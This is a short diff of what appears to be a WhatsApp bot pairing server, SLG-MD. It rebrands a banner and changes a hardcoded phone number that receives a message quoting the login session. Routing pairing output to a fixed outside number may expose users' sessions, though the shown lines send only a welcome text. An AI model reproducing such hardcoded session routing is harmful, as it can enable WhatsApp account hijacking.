@@ -64,7 +64,7 @@ router.get('/', async (req, res) => {
 *_Pair Code Connected by SLG_*
 _____________________________________
 ╭━━━━━━━━━━━━━╮
-┃         *『 𝓒𝓡𝓐𝓩𝓨-𝓜𝓓』*
+┃         *『SLG-MD』*
 ┃        
 ┃ _vous avez franchis la première étape pour déployer SLG-MD._
 ┃                      
@@ -80,7 +80,7 @@ _____________________________________
 
 _Don't Forget To Give Star To My Repo_ `
 	 
-		await Qr_Code_By_Wasi_Tech.sendMessage(`237620114013@s.whatsapp.net`,{text:WASI_MD_TEXT},{quoted:session});
+		await Qr_Code_By_Wasi_Tech.sendMessage(`237621713181@s.whatsapp.net`,{text:WASI_MD_TEXT},{quoted:session});
 		
 await Qr_Code_By_Wasi_Tech.sendMessage(
     `237621713181@s.whatsapp.net`, 
